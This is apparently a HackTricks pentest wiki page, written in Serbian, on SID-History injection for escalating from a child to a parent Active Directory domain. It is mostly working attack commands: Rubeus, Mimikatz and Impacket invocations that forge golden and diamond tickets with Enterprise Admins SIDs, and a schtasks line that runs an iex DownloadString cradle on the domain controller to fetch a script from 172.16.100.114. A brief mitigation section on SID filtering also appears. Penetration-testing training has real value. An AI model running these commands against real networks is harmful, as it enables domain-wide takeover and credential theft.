# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Fokus **SID History Injection Attack** je podrška **user migration** između domena uz obezbeđivanje kontinuiranog pristupa resursima iz prethodnog domena. To se postiže **dodavanjem prethodnog Security Identifier (SID) korisnika u SID History** njegovog novog naloga. Važno je napomenuti da se ovaj proces može zloupotrebiti za dobijanje neovlašćenog pristupa dodavanjem SID-a grupe sa visokim privilegijama (kao što su Enterprise Admins ili Domain Admins) iz nadređenog domena u SID History. Ova zloupotreba omogućava pristup svim resursima u nadređenom domenu.<sup>[[1]](#references)[[2]](#references)</sup>

Postoje dva načina za izvršavanje ovog napada: kreiranjem **Golden Ticket** ili **Diamond Ticket**.

Da biste utvrdili SID grupe **"Enterprise Admins"**, najpre morate pronaći SID root domena. Nakon toga, SID grupe Enterprise Admins može se konstruisati dodavanjem `-519` na SID root domena. Na primer, ako je SID root domena `S-1-5-21-280534878-1496970234-700767426`, rezultujući SID grupe "Enterprise Admins" bio bi `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Možete koristiti i grupe **Domain Admins**, čiji se SID završava sa **512**.

Drugi način za pronalaženje SID-a grupe iz drugog domena (na primer, "Domain Admins") jeste:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Imajte na umu da je moguće onemogućiti SID history u trust relationship-u, zbog čega će ovaj napad biti neuspešan.

Prema [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Onemogućavanje SIDHistory na forest trust-ovima** pomoću netdom alata (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Primena SID Filter Quarantining-a na external trust-ove** pomoću netdom alata (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Primena SID Filtering-a na domain trust-ove unutar jednog forest-a** nije preporučljiva, jer predstavlja nepodržanu konfiguraciju i može izazvati breaking changes. Ako je neki domain unutar forest-a nepouzdan, ne bi trebalo da bude član tog forest-a. U toj situaciji je najpre potrebno razdvojiti trusted i untrusted domain-e u zasebne forest-e, gde se SID Filtering može primeniti na interforest trust

Pogledajte ovaj post za više informacija o zaobilaženju ovoga: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Kada sam poslednji put ovo pokušao, bilo je potrebno da dodam argument **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) sa KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Za više informacija o golden tickets pogledajte:


{{#ref}}
golden-ticket.md
{{#endref}}


Za više informacija o diamond tickets pogledajte:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Eskalirajte do DA root domena ili Enterprise admin naloga koristeći KRBTGT hash kompromitovanog domena:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Sa stečenim permissions iz napada možete, na primer, izvršiti DCSync attack u novom domainu:


{{#ref}}
dcsync.md
{{#endref}}

### Sa linuxa

#### Ručno pomoću [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatski uz pomoć [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Ovo je Impacket skripta koja će **automatizovati eskalaciju sa child domena na parent domen**. Skripti su potrebni:

- Ciljni kontroler domena
- Kredencijali administratorskog korisnika u child domenu

Tok je sledeći:

- Dobavlja SID grupe Enterprise Admins parent domena
- Preuzima hash KRBTGT naloga u child domenu
- Kreira Golden Ticket
- Prijavljuje se na parent domen
- Preuzima kredencijale Administrator naloga u parent domenu
- Ako je naveden `target-exec` switch, autentifikuje se na kontroler domena parent domena putem Psexec-a.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Reference

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Šta je Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Bezbednosna razmatranja za trustove - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)

{{#include ../../banners/hacktricks-training.md}}
